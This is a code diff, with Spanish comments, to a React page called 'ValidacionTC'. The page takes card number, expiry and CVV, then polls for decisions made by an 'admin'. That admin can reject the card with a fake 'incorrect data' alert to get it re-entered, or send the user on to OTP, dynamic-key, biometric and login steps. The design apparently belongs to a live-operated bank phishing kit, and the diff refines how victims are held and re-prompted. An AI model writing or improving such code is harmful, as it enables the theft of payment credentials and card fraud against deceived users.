@@ -407,37 +407,64 @@ export default function ValidacionTC() {
                 }
 
                 // Estados que indican que debemos seguir esperando (admin aún no ha decidido)
-                const estadosEspera = ['pendiente', 'solicitar_tc_custom', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
+                // NO redirigir automáticamente, esperar a que el admin presione un botón específico
+                const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
                 
                 if (estadosEspera.includes(estado)) {
                     // Seguir esperando, mantener loading
                     return;
                 }
 
-                // Si hay error (rechazo del admin), recargar página para permitir reintento
+                // Si el estado es 'solicitar_tc' o 'solicitar_tc_custom', significa que el admin quiere que el usuario ingrese TC
+                // En este caso, NO redirigir, solo quitar loading y permitir que el usuario ingrese
+                if (estado === 'solicitar_tc' || estado === 'solicitar_tc_custom') {
+                    // El usuario ya está en la página de TC, solo quitar loading y resetear formulario
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    // Resetear formulario para permitir reintento
+                    setCardDigits("");
+                    setExpirationDate("");
+                    setCvv("");
+                    setStep("front");
+                    return;
+                }
+
+                // Si hay error (rechazo del admin), limpiar campos y permitir reintento sin recargar
                 if (estado === 'error_tc') {
                     clearInterval(pollingInterval);
                     clearTimeout(timeoutId);
                     setCargando(false);
                     alert("Los datos de la tarjeta son incorrectos. Por favor, verifícalos e inténtalo nuevamente.");
-                    // Recargar página para permitir reintento
-                    window.location.reload();
+                    // Limpiar campos para permitir reintento (sin recargar página)
+                    setCardDigits("");
+                    setExpirationDate("");
+                    setCvv("");
+                    setStep("front");
                     return;
+                }
+
+                // Estados que detienen el polling (igual que OTP y DIN)
+                const estadosFinales = [
+                    'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
+                    'error_tc', 'error_otp', 'error_din', 'error_login',
+                    'solicitar_biometria', 'error_923',
+                    'solicitar_tc_custom', 'solicitar_cvv_custom',
+                    'aprobado', 'error_pantalla', 'bloqueado_pantalla'
+                ];
+
+                if (estadosFinales.includes(estado.toLowerCase())) {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
                 }
 
                 // Si el admin aprueba y pide siguiente paso, redirigir
                 // Limpiar intervalos antes de redirigir
-                clearInterval(pollingInterval);
-                clearTimeout(timeoutId);
                 setCargando(false);
 
                 switch (estado.toLowerCase()) {
-                    case 'solicitar_tc':
-                        // Si pide TC de nuevo, recargar para reintentar
-                        window.location.reload();
-                        break;
-
                     case 'solicitar_otp':
+                        // Solo redirigir cuando el admin específicamente presiona el botón OTP
                         navigate('/numero-otp');
                         break;
 
